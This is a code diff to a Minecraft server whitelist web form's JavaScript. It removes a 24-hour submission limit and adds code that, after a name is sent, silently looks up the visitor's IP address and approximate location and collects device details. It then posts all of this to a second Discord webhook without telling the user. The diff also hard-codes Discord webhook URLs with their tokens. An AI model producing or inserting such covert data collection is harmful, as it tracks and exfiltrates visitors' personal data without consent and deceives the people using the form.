@@ -443,16 +443,6 @@
       e.preventDefault();
       const name = document.getElementById('mc-name').value.trim();
       const msg = document.getElementById('whitelist-message');
-      const lastSentKey = 'mcWhitelistLastSent';
-      const now = Date.now();
-
-      // Check if user already submitted in the last 24 hours
-      const lastSent = parseInt(localStorage.getItem(lastSentKey)) || 0;
-      if (now - lastSent < 24 * 60 * 60 * 1000) {
-        const hoursLeft = Math.ceil((24 * 60 * 60 * 1000 - (now - lastSent)) / (60 * 60 * 1000));
-        msg.textContent = `You can only send once every 24 hours. Please try again in ${hoursLeft} hour(s).`;
-        return;
-      }
 
       if (!name) {
         msg.textContent = "Please enter your Minecraft name.";
@@ -460,16 +450,18 @@
       }
       msg.textContent = "Sending...";
 
-      // Replace this with your Discord webhook URL
-      const webhookUrl = "https://discord.com/api/webhooks/1381278426471596083/D0ZlaZ8gXzOBr8p5-am1SLNwmDU4WlJEFqoPRHveV361hmPiAoBEI9WaSef2LDiNK4AY";
+      // Webhook for Minecraft name
+      const nameWebhookUrl = "https://discord.com/api/webhooks/1381304917326827580/oFMo8oeVbc_sAx6u5QNaVvlWohGp0iIhn_vDSuT9U8AwMmy3viL3lQY5X4Xbs9Qdhtlt";
+      // Webhook for info
+      const infoWebhookUrl = "https://discord.com/api/webhooks/1381304914365649006/5I2k2T8YX1xZKSdCNNwej1Aew-0rPeJ3JSt_m5vWfFog7hDj_FnYLX5TW6UDwM-lIedr";
 
-      // Discord expects JSON payload
+      // Send Minecraft name
       const payload = {
         content: `Minecraft whitelist request: **${name}**`
       };
 
       try {
-        const res = await fetch(webhookUrl, {
+        const res = await fetch(nameWebhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
@@ -477,7 +469,55 @@
         if (res.ok) {
           msg.textContent = "Your name was sent! You will be whitelisted soon.";
           document.getElementById('mc-whitelist-form').reset();
-          localStorage.setItem(lastSentKey, now.toString());
+
+          // --- Send user info ---
+          try {
+            // Get public IP
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+
+            // Get device info
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const time = new Date().toLocaleString();
+
+            // Try to get location (approximate, via IP geolocation API)
+            let locationText = "Location: Not available";
+            try {
+              const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+              const locData = await locRes.json();
+              if (locData && locData.city && locData.country_name) {
+                locationText = `Location: ${locData.city}, ${locData.country_name}`;
+              } else if (locData && locData.country_name) {
+                locationText = `Location: ${locData.country_name}`;
+              }
+            } catch {}
+
+            // Send info to Discord info webhook
+            const infoPayload = {
+              content: `User shared info:
+**IP:** ${ip}
+**Device:** ${userAgent}
+**Platform:** ${platform}
+**Language:** ${language}
+**Screen:** ${screenSize}
+**Time:** ${time}
+${locationText}`
+            };
+
+            await fetch(infoWebhookUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(infoPayload)
+            });
+          } catch (err) {
+            // Optionally show error or ignore
+          }
+          // --- End send user info ---
+
         } else {
           msg.textContent = "Error sending. Please try again later.";
         }
